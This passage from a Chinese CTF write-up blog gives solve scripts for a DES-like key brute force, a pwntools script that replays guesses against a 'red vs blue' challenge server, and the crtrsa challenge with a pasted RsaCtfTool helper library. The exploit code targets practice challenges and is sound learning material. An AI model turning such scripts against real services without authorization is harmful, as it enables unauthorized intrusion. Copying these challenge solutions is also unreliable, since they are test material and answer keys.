inv_func</span></span><br><span class="line">s_out1 = inv_per_func(f_final1)</span><br><span class="line"><span class="comment"># inv_sbox</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    bin_i = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    a1 = [<span class="built_in">int</span>(bin_i[_]+bin_i[_+<span class="number">1</span>], <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_i), <span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># j&#x27;s sbox</span></span><br><span class="line">    j1 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># i&#x27;s row</span></span><br><span class="line">    s_input1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> a1:</span><br><span class="line">        t1 = <span class="built_in">int</span>(s_out1[i1 * <span class="number">4</span>:i1 * <span class="number">4</span> + <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">        column1 = find_column(t1, j1, i1)</span><br><span class="line">        j1 += <span class="number">1</span></span><br><span class="line">        s_input1 += <span class="built_in">bin</span>(i1)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="number">0</span>] + <span class="built_in">bin</span>(column1)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="built_in">bin</span>(i1)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    key1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(s_input1, <span class="number">2</span>) ^ <span class="built_in">int</span>(EXP1, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># key2</span></span><br><span class="line">    f_final2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(right, <span class="number">2</span>) ^ <span class="built_in">int</span>(RIGHT, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    s_out2 = inv_per_func(f_final2)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        bin_j = <span class="built_in">bin</span>(j)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        a2 = [<span class="built_in">int</span>(bin_j[_] + bin_j[_ + <span class="number">1</span>], <span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_j), <span class="number">2</span>)]</span><br><span class="line">        j2 = <span class="number">0</span></span><br><span class="line">        s_input2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> a2:</span><br><span class="line">            t2 = <span class="built_in">int</span>(s_out2[j2 * <span class="number">4</span>:j2 * <span class="number">4</span> + <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            column2 = find_column(t2, j2, i2)</span><br><span class="line">            j2 += <span class="number">1</span></span><br><span class="line">            s_input2 += <span class="built_in">bin</span>(i2)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="number">0</span>] + <span class="built_in">bin</span>(column2)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>) + <span class="built_in">bin</span>(i2)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        key2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(s_input2, <span class="number">2</span>) ^ <span class="built_in">int</span>(EXP2, <span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        sub_keys = [key1, key2]</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(mydec(c, sub_keys), <span class="number">16</span>))</span><br><span class="line">        <span class="built_in">print</span>(i, i*j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Misc-red-vs-blue"><a href="#Misc-red-vs-blue" class="headerlink" title="Misc-red_vs_blue"></a>Misc-red_vs_blue</h3><p>经典红蓝对决，Misc的签到题，但是说实话，我有点麻</p>
<p>给了一个nc，连上玩一下就知道是两种情况让你猜，连续猜对66次得flag，每次连nc输赢的结果不同</p>
<p>这是当时我的脚本，我自以为没什么问题的吧，但是交互的情况让我几度咯血，各种IO错乱</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rest</span>():</span></span><br><span class="line">    <span class="comment"># not so fast</span></span><br><span class="line">    time.sleep(<span class="number">.05</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">r = <span class="string">b&#x27;r&#x27;</span></span><br><span class="line">b = <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28719</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># begin info</span></span><br><span class="line">sh.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># classical try red one</span></span><br><span class="line">    rest()</span><br><span class="line">    bug = sh.sendline(r)</span><br><span class="line">    feedback = sh.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Sorry&#x27;</span> <span class="keyword">in</span> feedback:</span><br><span class="line">        res.append(b)</span><br><span class="line">        sh.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res.append(r)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        rest()</span><br><span class="line">        sh.sendline(i)</span><br><span class="line">        flag = sh.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br></pre></td></tr></table></figure>

<p>然后问了pwn爷，怎样能达到好的交互效果；最后彭总给了一个脚本，学到了，写得好规整，吾辈楷模，贴下来日后遇到再学习</p>
<p><strong>主要就是一些格式上的转换，然后还有一句话一句话接收吧</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># connection</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28719</span>)</span><br><span class="line"><span class="comment"># receive intro text</span></span><br><span class="line">p.recvline()  <span class="comment"># Here are 66 AWD Games will begin!</span></span><br><span class="line">p.recvline()  <span class="comment"># The winner is between Red Team and Blue Team</span></span><br><span class="line">p.recvline()  <span class="comment"># To get the flag if you predict the results of all games successfully!</span></span><br><span class="line">p.recvline()  <span class="comment"># Game 1</span></span><br><span class="line">p.recvline()  <span class="comment"># choose one [r] Red Team,[b] Blue Team:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># record the results</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Your choice xxx Team</span></span><br><span class="line">    <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># The result xxx Team</span></span><br><span class="line">    <span class="comment"># win: The number of successful predictions xx</span></span><br><span class="line">    <span class="comment"># lose: Sorry!You are wrong!</span></span><br><span class="line">    result = p.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="comment"># print(result.find(&quot;successful&quot;))</span></span><br><span class="line">    <span class="keyword">if</span> result.find(<span class="string">&quot;successful&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(&quot;continue..&quot;)</span></span><br><span class="line">        s += <span class="string">&quot;r&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Game x</span></span><br><span class="line">        p.recvline()  <span class="comment"># choose one [r] Red Team,[b] Blue Team:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> result.find(<span class="string">&quot;wrong&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(&quot;retry..&quot;)</span></span><br><span class="line">        s += <span class="string">&quot;b&quot;</span></span><br><span class="line">        p.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;y&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Play again? (y/n):Game 1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">        <span class="comment"># repeat</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="comment"># print(p.recvline().decode(),end=&quot;&quot;)# Game x</span></span><br><span class="line">            p.recvline()</span><br><span class="line">            <span class="comment"># print(p.recvline().decode(),end=&quot;&quot;)# choose one [r] Red Team,[b] Blue Team:</span></span><br><span class="line">            p.sendline(<span class="built_in">bytes</span>(s[i], encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(s[i])</span><br><span class="line">            p.recvline()  <span class="comment"># Your choice xxx Team</span></span><br><span class="line">            p.recvline()  <span class="comment"># The result xxx Team</span></span><br><span class="line">            p.recvline()  <span class="comment"># win: The number of successful predictions xx</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># Game x</span></span><br><span class="line">        <span class="built_in">print</span>(p.recvline().decode(), end=<span class="string">&quot;&quot;</span>)  <span class="comment"># choose one [r] Red Team,[b] Blue Team:</span></span><br></pre></td></tr></table></figure>

<h2 id="极客巅峰"><a href="#极客巅峰" class="headerlink" title="极客巅峰"></a>极客巅峰</h2><h3 id="Crypto-crtrsa"><a href="#Crypto-crtrsa" class="headerlink" title="Crypto-crtrsa"></a>Crypto-crtrsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flagn,p,q</span><br><span class="line"><span class="comment">#p and q are two primes generated by getPrime</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		dp = random.randint(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)</span><br><span class="line">		dq = random.randint(<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> gcd(dp, p - <span class="number">1</span>) == <span class="number">1</span> <span class="keyword">and</span> gcd(dq, q - <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">			d = crt([dp,dq],[p-<span class="number">1</span>,q-<span class="number">1</span>])</span><br><span class="line">			phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">			R = Integers(phi)</span><br><span class="line">			e = R(d)^-<span class="number">1</span></span><br><span class="line">			<span class="keyword">return</span> p*q,e</span><br><span class="line">n,e = key_gen()</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(flagn,<span class="built_in">int</span>(e),n))</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e = 2953544268002866703872076551930953722572317122777861299293407053391808199220655289235983088986372630141821049118015752017412642148934113723174855236142887</span><br><span class="line">N = 6006128121276172470274143101473619963750725942458450119252491144009018469845917986523007748831362674341219814935241703026024431390531323127620970750816983</span><br><span class="line">flag = 4082777468662493175049853412968913980472986215497247773911290709560282223053863513029985115855416847643274608394467813391117463817805000754191093158289399</span><br></pre></td></tr></table></figure>

<p>e很大，但是显然d也很大，所以那俩家伙都不行；从已知看，像dp泄漏，但e太大，枚举不了；最后看到<a href="https://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">一位师傅博客</a>上记录着RSA - Small CRT Private Exponents，可惜师傅没有给exp；然后也找到相关的论文，满大街都是，可惜看不懂；然后还是在github上找到了实现，就是来自密码狗狗手一个的RsaCtfTool中的一个工具small_crt_exp，贴下链接<a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a>，但是没太弄懂怎么使用命令行，直接拿源码了，拼凑下，完整的exp是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.libs.ntl.ntl_ZZ_pX <span class="keyword">import</span> ntl_ZZ_pContext, ntl_ZZ_pX</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">&quot;global_logger&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gmpy</span><br><span class="line"></span><br><span class="line">    gmpy_version = <span class="number">2</span></span><br><span class="line">    mpz = gmpy.mpz</span><br><span class="line">    logger.info(<span class="string">&quot;[+] Using gmpy version 2 for math.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> gmpy</span><br><span class="line"></span><br><span class="line">        gmpy_version = <span class="number">1</span></span><br><span class="line">        mpz = gmpy.mpz</span><br><span class="line">        logger.info(<span class="string">&quot;[+] Using gmpy version 1 for math.&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        gmpy_version = <span class="number">0</span></span><br><span class="line">        mpz = <span class="built_in">int</span></span><br><span class="line">        gmpy = <span class="literal">None</span></span><br><span class="line">        logger.info(<span class="string">&quot;[+] Using python native functions for math.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpubkeysz</span>(<span class="params">n</span>):</span></span><br><span class="line">    size = <span class="built_in">int</span>(math.log2(n))</span><br><span class="line">    <span class="keyword">if</span> size &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        size += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_gcdext</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [b, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = b // a</span><br><span class="line">        r = b - (d * a)</span><br><span class="line">        g, y, x = _gcdext(r, a)</span><br><span class="line">        <span class="keyword">return</span> [g, x - d * y, y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    x, y = n, (n + <span class="number">1</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x, y = y, (y + n // y) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_gcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_introot</span>(<span class="params">n, r=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> r &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">else</span> -_introot(-n, r)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> _isqrt(n)</span><br><span class="line">    lower, upper = <span class="number">0</span>, n</span><br><span class="line">    <span class="keyword">while</span> lower != upper - <span class="number">1</span>:</span><br><span class="line">        mid = (lower + upper) &gt;&gt; <span class="number">1</span></span><br><span class="line">        m = <span class="built_in">pow</span>(mid, r)</span><br><span class="line">        <span class="keyword">if</span> m == n:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> m &lt; n:</span><br><span class="line">            lower = mid</span><br><span class="line">        <span class="keyword">elif</span> m &gt; n:</span><br><span class="line">            upper = mid</span><br><span class="line">    <span class="keyword">return</span> lower</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_introot_gmpy</span>(<span class="params">n, r=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> r &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">else</span> -_introot_gmpy(-n, r)</span><br><span class="line">    <span class="keyword">return</span> gmpy.root(n, r)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_introot_gmpy2</span>(<span class="params">n, r=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> r &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">else</span> -_introot_gmpy2(-n, r)</span><br><span class="line">    <span class="keyword">return</span> gmpy.iroot(n, r)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_invmod</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    a, x, u = a % m, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">        x, u, m, a = u, x - (m // a) * u, a, m % a</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_is_square</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = _isqrt(n)</span><br><span class="line">    <span class="keyword">return</span> i ** <span class="number">2</span> == n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span>(<span class="params">n, k=<span class="number">40</span></span>):</span></span><br><span class="line">    <span class="comment"># Taken from https://gist.github.com/Ayrx/5884790</span></span><br><span class="line">    <span class="comment"># Implementation uses the Miller-Rabin Primality Test</span></span><br><span class="line">    <span class="comment"># The optimal number of rounds for this test is 40</span></span><br><span class="line">    <span class="comment"># See http://stackoverflow.com/questions/6325576/how-many-iterations-of-rabin-miller-should-i-use-for-cryptographic-safe-primes</span></span><br><span class="line">    <span class="comment"># for justification</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If number is even, it&#x27;s a composite number</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s &gt;&gt;= <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, k):</span><br><span class="line">        a = random.randrange(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        x = <span class="built_in">pow</span>(a, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt;= r - <span class="number">1</span>:</span><br><span class="line">            x = <span class="built_in">pow</span>(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_fermat_prime_criterion</span>(<span class="params">n, b=<span class="number">2</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Fermat&#x27;s prime criterion</span></span><br><span class="line"><span class="string">    Returns False if n is definitely composite, True if posible prime.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(b, n - <span class="number">1</span>, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_is_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    If fermats prime criterion is false by short circuit we dont need to keep testing bases, so we return false for a guaranteed composite.</span></span><br><span class="line"><span class="string">    Otherwise we keep trying with primes 3 and 5 as base. The sweet spot is primes 2,3,5, it doesn&#x27;t improvee the runing time adding more primes to test as base.</span></span><br><span class="line"><span class="string">    If all the previus tests pass then we try with rabin miller.</span></span><br><span class="line"><span class="string">    All the tests are probabilistic.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        _fermat_prime_criterion(n)</span><br><span class="line">        <span class="keyword">and</span> _fermat_prime_criterion(n, b=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">and</span> _fermat_prime_criterion(n, b=<span class="number">5</span>)</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> miller_rabin(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_next_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> _is_prime(n):</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">erathostenes_sieve</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Returns  a list of primes &lt; n &quot;&quot;&quot;</span></span><br><span class="line">    sieve = [<span class="literal">True</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, isqrt(n) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i]:</span><br><span class="line">            sieve[<span class="built_in">pow</span>(i, <span class="number">2</span>) :: (i &lt;&lt; <span class="number">1</span>)] = [<span class="literal">False</span>] * (</span><br><span class="line">                (n - <span class="built_in">pow</span>(i, <span class="number">2</span>) - <span class="number">1</span>) // (i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">2</span>] + [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n, <span class="number">2</span>) <span class="keyword">if</span> sieve[i]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_primes = erathostenes_sieve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_primes_yield</span>(<span class="params">n</span>):</span></span><br><span class="line">    p = i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        p = next_prime(p)</span><br><span class="line">        <span class="keyword">yield</span> p</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_primes_yield_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    p = i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        p = gmpy.next_prime(p)</span><br><span class="line">        <span class="keyword">yield</span> p</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_primes_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(_primes_yield_gmpy(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_invert</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, b - <span class="number">2</span>, b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_lcm</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (x * y) // _gcd(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog2_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy.log2(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog_gmpy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gmpy.log(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog2_math</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(math.log2(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ilog_math</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span 